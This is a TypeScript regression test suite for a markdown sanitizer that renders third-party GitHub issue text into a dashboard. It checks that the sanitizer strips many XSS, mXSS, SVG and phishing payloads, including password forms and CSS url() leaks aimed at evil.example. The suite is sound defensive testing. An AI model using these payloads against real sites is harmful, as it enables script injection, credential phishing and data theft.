// Sanitizer tests for the real exported renderMarkdown.
//
// Task descriptions and comment bodies are mirrored verbatim from third-party
// sources (GitHub issue and comment bodies), so renderMarkdown is the security
// boundary between attacker-controlled markdown and the dashboard DOM. These
// tests pin that boundary: the payloads below must stay neutralised across any
// future change to the sanitizer configuration.
import { readFileSync, readdirSync, statSync } from 'node:fs';
import { fileURLToPath } from 'node:url';
import { dirname, join, relative } from 'node:path';
import { JSDOM } from 'jsdom';

// Deliberate version skew, do not "fix" blindly: package.json declares
// jsdom@^26.1.0 but @types/jsdom@^28.0.3. DefinitelyTyped publishes no types for
// jsdom 22-26 (its version list jumps 21.1.7 -> 27.0.0), and jsdom ships none of
// its own, so no matching major exists to pin to. 28.0.3 is `latest` and covers
// the two APIs used here (`new JSDOM(string)` and `.window`), both stable across
// all of these majors. jsdom is held at 26 because the component harness on the
// Phase 2 branch is built against it; renderMarkdown's output was verified
// byte-identical on 26.1.0 and 29.1.1 over a 95-payload corpus before pinning.
//
// DOMPurify binds to `globalThis.window` when its module is first evaluated, so
// a DOM has to exist before markdown.js (and its dompurify import) is loaded.
const dom = new JSDOM('');
const globals = globalThis as unknown as { window?: unknown; document?: unknown };
globals.window = dom.window;
globals.document = dom.window.document;

const { renderMarkdown } = await import('./markdown.js');

const failures: string[] = [];
let checks = 0;

function check(name: string, fn: () => void): void {
  checks += 1;
  try {
    fn();
  } catch (err) {
    failures.push(`${name}: ${(err as Error).message}`);
  }
}

function parse(html: string): HTMLElement {
  const host = dom.window.document.createElement('div');
  host.innerHTML = html;
  return host as unknown as HTMLElement;
}

function assertNoElement(html: string, selector: string, message: string): void {
  if (parse(html).querySelector(selector) !== null) {
    throw new Error(`${message}: found <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertElement(html: string, selector: string, message: string): void {
  if (parse(html).querySelector(selector) === null) {
    throw new Error(`${message}: no <${selector}> in ${JSON.stringify(html)}`);
  }
}

function assertNotContains(html: string, needle: string, message: string): void {
  if (html.toLowerCase().includes(needle.toLowerCase())) {
    throw new Error(`${message}: found ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertContains(html: string, needle: string, message: string): void {
  if (!html.includes(needle)) {
    throw new Error(`${message}: missing ${JSON.stringify(needle)} in ${JSON.stringify(html)}`);
  }
}

function assertEqual(actual: string, expected: string, message: string): void {
  if (actual !== expected) {
    throw new Error(`${message}: expected ${JSON.stringify(expected)}, got ${JSON.stringify(actual)}`);
  }
}

/** Fails if any element in the output carries an inline event handler. */
function assertNoEventHandlers(html: string, message: string): void {
  for (const el of parse(html).querySelectorAll('*')) {
    for (const attr of el.attributes) {
      if (attr.name.toLowerCase().startsWith('on')) {
        throw new Error(`${message}: ${el.tagName} has ${attr.name} in ${JSON.stringify(html)}`);
      }
    }
  }
}

// ---------------------------------------------------------------------------
// 1. Phishing surface — issue #195. Form controls must not survive.
// ---------------------------------------------------------------------------

function formControls(): void {
  const phishing = renderMarkdown(
    '<form action="https://evil.example"><input name=token type=password>' +
      '<button>Sign in</button></form>',
  );

  check('form tag stripped', () => {
    assertNoElement(phishing, 'form', 'credential-phishing form survived');
  });
  check('form action attribute stripped', () => {
    assertNotContains(phishing, 'evil.example', 'attacker origin survived');
    assertNotContains(phishing, 'action', 'action attribute survived');
  });
  check('password input stripped', () => {
    assertNoElement(phishing, 'input', 'password field survived');
    assertNotContains(phishing, '<input', 'input tag survived');
  });
  check('submit button stripped', () => {
    assertNoElement(phishing, 'button', 'submit button survived');
  });

  check('select and option stripped', () => {
    const out = renderMarkdown('<select><option>a</option></select>');
    assertNoElement(out, 'select', 'select survived');
    assertNotContains(out, '<option', 'option survived');
  });
  check('textarea stripped', () => {
    const out = renderMarkdown('<textarea>x</textarea>');
    assertNoElement(out, 'textarea', 'textarea survived');
  });
  check('formaction stripped', () => {
    const out = renderMarkdown('<button formaction="https://evil.example">go</button>');
    assertNotContains(out, 'formaction', 'formaction survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });
}

// ---------------------------------------------------------------------------
// 2. Spoofing surface — audit findings LOW-1 (style) and LOW-2 (download).
// ---------------------------------------------------------------------------

function spoofingAttributes(): void {
  check('style attribute stripped', () => {
    const out = renderMarkdown(
      '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh">overlay</div>',
    );
    assertNotContains(out, 'style=', 'inline style survived');
    assertNotContains(out, 'position:fixed', 'overlay styling survived');
    assertContains(out, 'overlay', 'element content should be preserved');
  });

  check('download attribute stripped', () => {
    const out = renderMarkdown('<a href="https://x.example/f" download="invoice.pdf">dl</a>');
    assertNotContains(out, 'download', 'download attribute survived');
    assertContains(out, 'https://x.example/f', 'safe href should be preserved');
  });

  // A non-modal <dialog> gets `position: absolute` and an opaque
  // `background-color: Canvas` from the HTML Standard's default rendering, so it
  // is an overlay primitive that needs no style attribute to work.
  check('dialog stripped (no fake modal)', () => {
    const out = renderMarkdown('<dialog open>Enter your password</dialog>');
    assertNoElement(out, 'dialog', 'dialog survived');
    assertContains(out, 'Enter your password', 'content should be preserved');
  });

  // Both sinks inject this HTML inside a Lit shadow root that carries the
  // component's own stylesheet, so a surviving class would resolve against real
  // component CSS. This is the audit's verified forged-comment-header payload.
  check('class attribute stripped (no CSS-reuse forgery)', () => {
    const out = renderMarkdown(
      '<div class="comment"><div class="comment-header">' +
        '<span class="comment-author">farmtable-admin</span>' +
        '<span class="comment-time">2 minutes ago</span></div>' +
        '<div class="comment-body">Your session expired.</div></div>',
    );
    assertNotContains(out, 'class=', 'class attribute survived');
    assertNotContains(out, 'comment-header', 'component class name survived');
    assertContains(out, 'farmtable-admin', 'text content should be preserved');
  });
}

// ---------------------------------------------------------------------------
// 3. Script execution regressions. These already hold; pinned so that a future
//    configuration change cannot silently reopen script execution.
// ---------------------------------------------------------------------------

function scriptExecution(): void {
  check('script tag stripped', () => {
    const out = renderMarkdown('<script>alert(1)</script>');
    assertNoElement(out, 'script', 'script survived');
    assertNotContains(out, 'alert(1)', 'script body survived');
  });

  check('inline event handler stripped', () => {
    const out = renderMarkdown('<img src=x onerror=alert(1)>');
    assertNoEventHandlers(out, 'event handler survived');
    assertNotContains(out, 'onerror', 'onerror survived');
  });

  check('javascript: href stripped', () => {
    const out = renderMarkdown('[click](javascript:alert(1))');
    assertNotContains(out, 'javascript:', 'javascript: URL survived');
    assertContains(out, 'click', 'link text should be preserved');
  });

  check('data: html href stripped', () => {
    const out = renderMarkdown('[click](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)');
    assertNotContains(out, 'data:text/html', 'data: HTML URL survived');
  });

  check('iframe srcdoc stripped', () => {
    const out = renderMarkdown('<iframe srcdoc="<script>alert(1)</script>"></iframe>');
    assertNoElement(out, 'iframe', 'iframe survived');
    assertNotContains(out, 'srcdoc', 'srcdoc survived');
  });

  check('mXSS mglyph payload neutralised', () => {
    const out = renderMarkdown(
      '<math><mtext><table><mglyph><style><!--</style><img title="-->' +
        '<img src=1 onerror=alert(1)>">',
    );
    assertNoElement(out, 'img', 'mXSS img survived');
    assertNoEventHandlers(out, 'mXSS handler survived');
    assertNotContains(out, 'alert(1)', 'mXSS payload survived');
  });

  check('base tag stripped', () => {
    const out = renderMarkdown('<base href="https://evil.example/">');
    assertNoElement(out, 'base', 'base survived');
    assertNotContains(out, 'evil.example', 'base href survived');
  });

  check('meta refresh stripped', () => {
    const out = renderMarkdown('<meta http-equiv="refresh" content="0;url=https://evil.example">');
    assertNoElement(out, 'meta', 'meta survived');
    assertNotContains(out, 'evil.example', 'redirect target survived');
  });

  check('object and embed stripped', () => {
    const out = renderMarkdown(
      '<object data="https://evil.example/x"></object><embed src="https://evil.example/y">',
    );
    assertNoElement(out, 'object', 'object survived');
    assertNoElement(out, 'embed', 'embed survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  check('style element stripped', () => {
    const out = renderMarkdown('<style>body{display:none}</style>');
    assertNoElement(out, 'style', 'style element survived');
    assertNotContains(out, 'display:none', 'style rules survived');
  });

  check('target attribute stripped (no tabnabbing)', () => {
    const out = renderMarkdown('<a href="https://x.example" target="_blank">x</a>');
    assertNotContains(out, 'target', 'target survived');
  });
}

// ---------------------------------------------------------------------------
// 3b. SVG. <svg> is in DOMPurify's default allowlist and survives, and SVG is
//     historically the richest bypass surface after MathML: foreignObject
//     re-enters the HTML namespace, the animation elements can retarget an
//     attribute at runtime, and xlink:href is a second URL channel that a naive
//     href-only check misses. All of these are neutralised today; pinned so a
//     configuration change cannot silently reopen them.
//
//     Note both assertion styles are used throughout, for the reason given at
//     the mXSS check above: a structural query alone can false-negative on
//     re-parse.
// ---------------------------------------------------------------------------

function svgSurface(): void {
  // foreignObject is an HTML integration point, so a form inside it is parsed in
  // the HTML namespace and would be a working phishing form if it survived.
  check('svg foreignObject cannot smuggle form controls', () => {
    const out = renderMarkdown(
      '<svg><foreignObject><form action="https://evil.example">' +
        '<input name=token type=password></form></foreignObject></svg>',
    );
    assertNoElement(out, 'form', 'form survived inside foreignObject');
    assertNoElement(out, 'input', 'password field survived inside foreignObject');
    assertNotContains(out, 'foreignobject', 'foreignObject survived');
    assertNotContains(out, 'evil.example', 'attacker origin survived');
  });

  check('svg script element stripped', () => {
    const out = renderMarkdown('<svg><script>alert(1)</script></svg>');
    assertNoElement(out, 'script', 'script survived inside svg');
    assertNotContains(out, 'alert(1)', 'script body survived');
  });

  check('svg event handler stripped', () => {
    const out = renderMarkdown('<svg onload=alert(1)><circle onclick=alert(2)></circle></svg>');
    assertNoEventHandlers(out, 'svg event handler survived');
    assertNotContains(out, 'onload', 'onload survived');
    assertNotContains(out, 'alert(', 'handler body survived');
  });

  // animate/set can rewrite another element's attribute after sanitization, so
  // they are a way to introduce a javascript: URL that was never in the markup.
  check('svg animation elements stripped', () => {
    const animate = renderMarkdown(
      '<svg><animate attributeName="href" values="javascript:alert(1)"></animate></svg>',
    );
    assertNoElement(animate, 'animate', 'animate survived');
    assertNotContains(animate, 'attributename', 'animate attributeName survived');
    assertNotContains(animate, 'javascript:', 'animated javascript: URL survived');

    const set = renderMarkdown(
      '<svg><set attributeName="href" to="javascript:alert(1)"></set></svg>',
    );
    assertNoElement(set, 'set', 'set survived');
    assertNotContains(set, 'javascript:', 'animated javascript: URL survived');
  });

  // xlink:href is a separate attribute from href and needs its own coverage.
  check('svg xlink:href javascript URL stripped', () => {
    const out = renderMarkdown(
      '<svg><a xlink:href="javascript:alert(1)"><text y="20">click</text></a></svg>',
    );
    assertNotContains(out, 'javascript:', 'xlink javascript: URL survived');
    assertNotContains(out, 'xlink', 'xlink attribute survived');
    assertContains(out, 'click', 'link text should be preserved');
  });

  check('svg use element stripped', () => {
    const out = renderMarkdown(
      '<svg><use href="#x"></use>' +
        '<use xlink:href="data:image/svg+xml;base64,PHN2Zz48L3N2Zz4="></use></svg>',
    );
    assertNoElement(out, 'use', 'use survived');
    assertNotContains(out, 'data:image/svg+xml', 'data: URL reference survived');
  });

  check('svg image javascript URL stripped', () => {
    const out = renderMarkdown('<svg><image href="javascript:alert(1)"></image></svg>');
    assertNotContains(out, 'javascript:', 'image javascript: URL survived');
    assertNoEventHandlers(out, 'image event handler survived');
  });

  // DOMPurify strips <style> in the HTML namespace by default but allows it in
  // the SVG one, so this is the one place a <style> element can reach the shadow
  // root. Arbitrary CSS there outranks the forbidden inline style attribute: it
  // restyles the whole component, not one element.
  check('svg style element stripped (no CSS injection into the shadow root)', () => {
    const out = renderMarkdown(
      '<svg><style>:host{position:fixed;top:0;left:0;width:100vw;height:100vh;' +
        'background:#fff;z-index:9999}</style></svg>',
    );
    assertNoElement(out, 'style', 'style element survived inside svg');
    assertNotContains(out, 'position:fixed', 'overlay rule survived');
    assertNotContains(out, 'z-index', 'stacking rule survived');
  });

  // Distinct from the visual-spoofing case above: @import and url() in a rule
  // reach an attacker origin with no user interaction, so the fix has to be
  // pinned against the remote-fetch vector specifically and not just the
  // overlay one.
  check('svg style cannot reach an attacker origin', () => {
    const imported = renderMarkdown(
      '<svg><style>@import url(https://evil.example/x.css);</style></svg>',
    );
    assertNoElement(imported, 'style', 'style element survived');
    assertNotContains(imported, '@import', '@import survived');
    assertNotContains(imported, 'evil.example', 'remote stylesheet origin survived');

    const exfil = renderMarkdown(
      '<svg><style>a[href^="https://internal"]{background:url(https://evil.example/leak)}' +
        '</style></svg>',
    );
    assertNoElement(exfil, 'style', 'style element survived');
    assertNotContains(exfil, 'evil.example', 'exfiltration origin survived');
  });

  // The sinks wrap markdown in block containers, so a payload does not need a
  // top-level raw-HTML block to reach the sanitizer.
  check('svg style stripped inside markdown containers', () => {
    for (const md of [
      '- <svg><style>*{display:none}</style></svg>',
      '> <svg><style>*{display:none}</style></svg>',
      '| a |\n| - |\n| <svg><style>*{display:none}</style></svg> |',
    ]) {
      const out = renderMarkdown(md);
      assertNoElement(out, 'style', `style survived in ${JSON.stringify(md)}`);
      assertNotContains(out, 'display:none', `style rules survived in ${JSON.stringify(md)}`);
    }
  });
}

// ---------------------------------------------------------------------------
// 4. Positive cases. A sanitizer that breaks ordinary rendering is its own
//    outage, so pin the shapes real task descriptions rely on.
// ---------------------------------------------------------------------------

function ordinaryMarkdown(): void {
  check('headings render', () => {
    assertEqual(renderMarkdown('# Title'), '<h1>Title</h1>\n', 'heading changed');
  });

  check('emphasis renders', () => {
    assertEqual(
      renderMarkdown('**bold** and _em_'),
      '<p><strong>bold</strong> and <em>em</em></p>\n',
      'emphasis changed',
    );
  });

  check('safe links render with href intact', () => {
    const out = renderMarkdown('[docs](https://example.com/docs)');
    assertElement(out, 'a[href="https://example.com/docs"]', 'safe link lost its href');
    assertContains(out, 'docs</a>', 'link text lost');
  });

  check('relative links render', () => {
    assertElement(renderMarkdown('[t](/tasks/1)'), 'a[href="/tasks/1"]', 'relative link lost');
  });

  // marked emits class="language-js" here; FORBID_ATTR strips it. Nothing in
  // this repo consumes that class (there is no syntax highlighter), so the loss
  // is cosmetically and functionally nil.
  check('code blocks render', () => {
    assertEqual(
      renderMarkdown('```js\nconst a = 1;\n```'),
      '<pre><code>const a = 1;\n</code></pre>\n',
      'code block changed',
    );
  });

  check('inline code escapes html', () => {
    const out = renderMarkdown('use `<form>` here');
    assertContains(out, '<code>&lt;form&gt;</code>', 'inline code lost its escaped content');
    assertNoElement(out, 'form', 'inline code produced a real form');
  });

  check('lists render', () => {
    assertEqual(
      renderMarkdown('- one\n- two\n'),
      '<ul>\n<li>one</li>\n<li>two</li>\n</ul>\n',
      'list changed',
    );
  });

  check('tables render', () => {
    const out = renderMarkdown('| a | b |\n| - | - |\n| 1 | 2 |\n');
    assertElement(out, 'table', 'table lost');
    assertContains(out, '<th>a</th>', 'table header lost');
  });

  check('images with safe src render', () => {
    assertElement(
      renderMarkdown('![alt](https://example.com/i.png)'),
      'img[src="https://example.com/i.png"]',
      'safe image lost',
    );
  });

  check('empty input renders empty', () => {
    assertEqual(renderMarkdown(''), '', 'empty markdown should render empty');
  });
}

// ---------------------------------------------------------------------------
// 5. Task lists. FORBID_TAGS strips marked's <input type=checkbox>, so
//    renderMarkdown substitutes an inert glyph. Pin that the checked and
//    unchecked states stay distinguishable, that the state is still exposed to
//    assistive technology, and that no input comes back.
// ---------------------------------------------------------------------------

function taskLists(): void {
  check('task list state survives without an input element', () => {
    const out = renderMarkdown('- [ ] todo\n- [x] done\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☐\uFE0E', 'unchecked state lost');
    assertContains(out, '☑\uFE0E', 'checked state lost');
    assertContains(out, 'todo', 'unchecked item text lost');
    assertContains(out, 'done', 'checked item text lost');
  });

  // The real <input type=checkbox> was announced with a checked/unchecked state;
  // the glyph only keeps that for screen readers via role + aria-label, so pin
  // both labels and their pairing with the right glyph.
  check('task list state is exposed to assistive technology', () => {
    const out = renderMarkdown('- [ ] todo\n- [x] done\n');
    assertElement(out, 'span[role="img"][aria-label="Completed"]', 'checked label lost');
    assertElement(out, 'span[role="img"][aria-label="Not completed"]', 'unchecked label lost');
    assertContains(out, '<span role="img" aria-label="Completed">☑\uFE0E</span>', 'checked pairing lost');
    assertContains(
      out,
      '<span role="img" aria-label="Not completed">☐\uFE0E</span>',
      'unchecked pairing lost',
    );
  });

  check('nested task lists keep their state', () => {
    const out = renderMarkdown('- [x] outer\n  - [ ] inner\n');
    assertNoElement(out, 'input', 'checkbox input survived');
    assertContains(out, '☑\uFE0E</span> outer', 'outer state lost');
    assertContains(out, '☐\uFE0E</span> inner', 'inner state lost');
  });
}

// ---------------------------------------------------------------------------
// 6. Sink binding. Everything above secures a function that nothing forces
//    anyone to call: drop the wrapper at either sink — `unsafeHTML(c.body)`
//    instead of `unsafeHTML(renderMarkdown(c.body))` — and every check above
//    still passes while the whole bug class is back.
//
//    Mechanism: a static scan of the source tree, not a rendering test. A
//    rendering test would be the stronger proof, but instantiating the two Lit
//    components needs custom elements, adopted stylesheets and the Shoelace and
//    gRPC imports they pull in, none of which this plain `node` runner has —
//    that is a vitest-and-a-component-harness change, which is the Phase 2
//    branch's job, not a six-file cleanup's. The static scan costs nothing, has
//    no dependencies, and catches the exact regression described. Its one real
//    weakness is the classic one for source scanning — passing vacuously because
//    it matched no files — so the file count and the sink count are both pinned
//    below, and locating the tree throws rather than returning empty.
// ---------------------------------------------------------------------------

/** Walks up from this module to the directory containing `src/util/markdown.ts`. */
function findWebRoot(): string {
  let dir = dirname(fileURLToPath(import.meta.url));
  for (let i = 0; i < 8; i += 1) {
    try {
      statSync(join(dir, 'src', 'util', 'markdown.ts'));
      return dir;
    } catch {
      const parent = dirname(dir);
      if (parent === dir) break;
      dir = parent;
    }
  }
  throw new Error('could not locate the web source tree from ' + import.meta.url);
}

function collectSourceFiles(dir: string, out: string[]): void {
  for (const entry of readdirSync(dir)) {
    const full = join(dir, entry);
    if (statSync(full).isDirectory()) {
      collectSourceFiles(full, out);
    } else if (entry.endsWith('.ts') && !entry.endsWith('.test.ts')) {
      out.push(full);
    }
  }
}

function sinkBinding(): void {
  const root = findWebRoot();
  const files: string[] = [];
  collectSourceFiles(join(root, 'src'), files);

  check('sink scan actually reads the source tree', () => {
    if (files.length < 10) {
      throw new Error(`expected to scan the src tree, found only ${files.length} .ts files`);
    }
  });

  const sinks: { file: string; arg: string }[] = [];
  for (const file of files) {
    const src = readFileSync(file, 'utf8');
    for (const m of src.matchAll(/unsafeHTML\(\s*([A-Za-z0-9_$.]*)/g)) {
      sinks.push({ file: relative(root, file), arg: m[1] ?? '' });
    }
  }

  // If this drops to 0 the check above would still pass, so pin it separately:
  // no sinks found must mean the regex broke, not that the code is safe.
  check('unsafeHTML call sites are still found', () => {
    if (sinks.length < 2) {
      throw new Error(`expected at least 2 unsafeHTML call sites, found ${sinks.length}`);
    }
  });

  check('every unsafeHTML sink routes through renderMarkdown', () => {
    const unbound = sinks.filter((s) => s.arg !== 'renderMarkdown');
    if (unbound.length > 0) {
      throw new Error(
        'unsanitized unsafeHTML sink(s): ' +
          unbound.map((s) => `${s.file} -> unsafeHTML(${s.arg}`).join(', '),
      );
    }
  });

  // unsafeHTML is not the only way to reach the DOM with a raw string; a new
  // innerHTML sink would bypass renderMarkdown without touching the check above.
  check('no raw-HTML sink other than unsafeHTML exists', () => {
    const banned = /\.innerHTML\s*=|\.outerHTML\s*=|insertAdjacentHTML\(|document\.write\(/;
    const offenders = files
      .filter((f) => banned.test(readFileSync(f, 'utf8')))
      .map((f) => relative(root, f));
    if (offenders.length > 0) {
      throw new Error(`raw-HTML sink outside renderMarkdown in: ${offenders.join(', ')}`);
    }
  });
}

function run(): void {
  formControls();
  spoofingAttributes();
  scriptExecution();
  svgSurface();
  ordinaryMarkdown();
  taskLists();
  sinkBinding();

  if (failures.length > 0) {
    throw new Error(
      `${failures.length} of ${checks} markdown sanitizer checks failed:\n` +
        failures.map((f) => `  - ${f}`).join('\n'),
    );
  }
  console.log(`markdown sanitizer: ${checks} checks passed`);
}

run();
